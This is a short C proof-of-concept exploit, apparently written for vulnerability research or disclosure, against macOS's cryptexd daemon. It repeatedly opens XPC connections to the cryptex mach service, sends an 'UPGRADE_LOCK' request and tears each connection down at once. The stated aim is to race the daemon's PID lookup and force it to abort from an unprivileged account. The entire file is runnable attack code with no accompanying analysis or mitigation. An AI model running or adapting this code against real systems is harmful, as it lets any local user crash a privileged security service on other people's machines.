#include <xpc/xpc.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <dispatch/dispatch.h>
// PoC: unprivileged UPGRADE_LOCK + immediate disconnect -> cryptexd xpc_connection_get_pid misuse abort
int main(int argc,char**argv){
  int N=argc>1?atoi(argv[1]):40;
  fprintf(stderr,"[*] euid=%d firing %d UPGRADE_LOCK+disconnect races\n",geteuid(),N);
  for(int i=0;i<N;i++){
    xpc_connection_t c=xpc_connection_create_mach_service("com.apple.security.cryptex.xpc",NULL,0);
    xpc_connection_set_event_handler(c,^(xpc_object_t e){});
    xpc_connection_resume(c);
    xpc_object_t m=xpc_dictionary_create(NULL,NULL,0);
    xpc_dictionary_set_string(m,"SUBSYSTEM","UPGRADE_LOCK");
    xpc_connection_send_message(c,m);   // fire-and-forget
    xpc_connection_cancel(c);           // immediate teardown => race on get_pid
    xpc_release(c);
    usleep(2000);
  }
  fprintf(stderr,"[*] done\n");
  return 0;
}
